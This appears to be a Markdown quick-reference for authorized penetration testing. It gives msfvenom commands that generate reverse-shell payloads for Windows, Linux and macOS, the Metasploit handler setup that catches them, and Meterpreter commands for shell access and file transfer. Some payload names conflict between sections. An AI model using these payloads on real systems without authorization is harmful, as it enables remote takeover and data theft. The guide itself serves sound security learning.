# 🚀 Metasploit Reverse Shell Blueprint
> **The definitive quick-reference guide for building reliable, cross-platform reverse shells using Metasploit.**
> *Designed for authorized penetration testing and isolated lab environments.*

---

## 🗺️ Table of Contents
1. [📍 Find Your Local IP Address](#-📍-find-your-local-ip-address)
2. [🛠️ Payload Generation (Staged vs. Stageless)](#-🛠️-payload-generation-staged-vs-stageless)
    *   [Windows 🪟](#windows-🪟)
    *   [Linux 🐧](#linux-🐧)
    *   [macOS 🍎](#macos-🍎)
3. [⚙️ Setting Up the Handler](#-⚙️-setting-up-the-handler)
4. [⌨️ Meterpreter Command Reference](#-⌨️-meterpreter-command-reference)
5. [🛡️ Safety & Authorization (The Golden Rules)](#-🛡️-safety--authorization-the-golden-rules)

---

## 📍 Find Your Local IP Address
Identify the machine's local network address that will host your listener. **Crucial:** Avoid using `127.0.0.1` unless you are testing loopback connectivity!

| OS | Command |
| :--- | :--- |
| **🐧 Linux** | `ip a` |
| **🍎 macOS** | `ipconfig getifaddr en0` |
| **🪟 Windows (PowerShell)** | `ipconfig` |

---

## 🛠️ Payload Generation: Staged vs. Stageless
Choose your payload architecture based on reliability needs.

### 🌟 Staged Payloads (Two Parts)
*   **How it works:** A small initial **Stager** connects to the handler and downloads the larger **Stage**.
*   **Pros:** Smaller initial footprint, faster execution start.
*   **Cons:** Requires two successful network transfers; prone to failure from firewalls or interruptions.

### ✨ Stageless Payloads (One Part)
*   **How it works:** All functionality is bundled into a single executable payload.
*   **Pros:** Single transfer point—removes one potential point of failure.
*   **Cons:** Can be larger; still subject to execution constraints (permissions, security software).

***

### 💻 Payload Generation Commands (`msfvenom`)

Replace `<YOUR_IP>` and `<YOUR_PORT>` in all examples below.

#### **Staged Payloads**
| OS | Command Example | Notes |
| :--- | :--- | :--- |
| **🪟 Windows** | `msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > payload.bat` | Creates a batch file. |
| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |

#### **Stageless Payloads**
| OS | Command Example | Notes |
| :--- | :--- | :--- |
| **🪟 Windows** | `msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f psh-cmd > boss.bat` | Creates a batch file. |
| **🐧 Linux (x64)** | `msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f elf > payload.elf` | Requires `chmod +x payload.elf`. |
| **🍎 macOS (AArch64)** | `msfvenom -p osx/aarch64/meterpreter_reverse_tcp lhost=<IP> lport=<PORT> -f macho > payload.macho` | Requires `chmod +x payload.macho`. |

---

## ⚙️ Setting Up the Metasploit Handler
Start your listener to catch incoming connections. **Ensure this matches your generated payload!**

1.  **Launch:** `msfconsole`
2.  **Select Module:** `use exploit/multi/handler`
3.  **Configure**
    **For Staged:**
    
    windows:
    ```text
    set PAYLOAD windows/meterpreter/reverse_tcp
    ```
    Linux:
    ```text
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    ```
    Mac:
    ```text
    set PAYLOAD osx/aarch64/meterpreter/reverse_tcp
    ```
    **For Stageless:**
    
    windows:
    ```text
    set PAYLOAD windows/meterpreter_reverse_tcp
    ```
    Linux:
    ```text
    set PAYLOAD linux/x64/meterpreter_reverse_tcp
    ```
    Mac:
    ```text
    set PAYLOAD osx/aarch64/meterpreter_reverse_tcp
    ```
    
    Then , 
    ```text
    set LHOST <YOUR_IP>
    set LPORT <YOUR_PORT>
    ```
4.  **Start:** `exploit` or `run`

> 💡 **Pro Tip:** The Handler's `PAYLOAD`, `LHOST`, and `LPORT` *must* perfectly match the payload you generated on the target machine.

---

## ⌨️ Meterpreter Command Reference
Once connected, use these commands to navigate your session:

| Command | Description | Quick Action |
| :--- | :--- | :--- |
| `help` | Displays all available commands. | **See All** |
| `sysinfo` | Retrieves OS and system details. | **System Check** |
| `getuid` | Shows the current user identity. | **Who Am I?** |
| `pwd` | Prints the Current Working Directory. | **Where Am I?** |
| `ls` | Lists files/directories in the current path. | **List Contents** |
| `shell` | Drops into a standard system shell (Bash/CMD). | **Shell Access** |
| `background` | Returns to the main `msf>` prompt while keeping the session active. | **Background Task** |
| `download` | Transfers an authorized file *from* the remote host. | **Pull File** |
| `upload` | Transfers an authorized file *to* the remote host. | **Push File** |

---

## 🛡️ Safety & Authorization (The Golden Rules)
This guide is for learning and controlled testing only. Adhere to these rules:

✅ **Obtain Explicit Permission:** Never test a system without documented authorization.
✅ **Use Controlled Targets:** Stick to intentionally vulnerable VMs or isolated lab networks.
✅ **Test Legally:** Assume everything else is production-grade until proven otherwise.
✅ **Clean Up:** Remove all artifacts and revert changes when the exercise is complete.

**Learn Responsibly. Test Legally. Secure What You Build.** 🔐

<p align="center">
  <sub style="font-size: 0.9em;">📚 Cybersecurity Learning Notes · Metasploit Framework · Authorized Lab Use Only</sub>
</p>

